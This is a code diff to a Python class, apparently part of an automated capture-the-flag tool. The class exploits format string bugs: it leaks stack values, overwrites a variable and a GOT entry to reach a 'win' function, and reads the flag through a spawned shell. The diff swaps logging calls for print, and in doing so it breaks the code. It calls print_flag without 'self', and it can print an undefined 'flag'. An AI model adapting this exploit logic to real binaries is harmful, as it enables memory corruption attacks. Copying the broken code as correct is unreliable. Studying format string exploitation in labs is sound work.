@@ -7,12 +7,11 @@ class FMT:
         self.analysis = analysis
         self.filename = analysis.binary
         self.e = ELF(self.filename)
-        self.fart_print = Print(v_lvl)
         
-        self.fart_print.info("Format string bug likely!")
+        print("Format string bug likely!")
 
     def build_exploit(self):
-        self.fart_print.info("Attempting to discover the constraings to exploiting the format string bug")
+        print("Attempting to discover the constraings to exploiting the format string bug")
         payload = None
         
         if not self.stack_leak():
@@ -22,7 +21,7 @@ class FMT:
                 self.got_overwrite()
 
     def stack_leak(self):
-        self.fart_print.info("Leaking the values on the stack with format string bug")
+        print("Leaking the values on the stack with format string bug")
         hex_vals = []
         
         # TODO: Variable length
@@ -53,7 +52,7 @@ class FMT:
             return False
 
     def write_prim(self):
-        self.fart_print.info("Overwriting the pwnme variable")
+        print("Overwriting the pwnme variable")
         offset = self.find_write_prim_offset()
         if offset:
             # Find the value
@@ -91,7 +90,7 @@ class FMT:
         pass
 
     def got_overwrite(self):
-        self.fart_print.info("GOT overwrite with format string bug")
+        print("GOT overwrite with format string bug")
         offset = self.find_write_prim_offset()
         if offset:
             win = self.e.sym['win']
@@ -104,19 +103,17 @@ class FMT:
             p = process(self.filename)
             p.sendline(payload)
 
-            self.print_flag(p)
+            print_flag(p)
 
-    def print_flag(self, p): 
+    def print_flag(self, p):
         if self.analysis.has_catflagtxt():
             p.recvuntil(b"<<<")
             p.recvline()
-
+        
             flag = p.recvline().decode('utf-8').strip('\n')
-            self.fart_print.flag(f"{self.analysis.bin_hash},{self.analysis.bin_name},{flag}")
         elif self.analysis.has_binsh():
             p.sendline(b"cat flag.txt")
             p.recvuntil(b"flag")
             flag = p.recvline().decode('utf-8').strip('\n')
-            self.fart_print.flag(f"{self.analysis.bin_hash},{self.analysis.bin_name},flag{flag}")
-
+        print(f"flag{flag}")
         p.close()
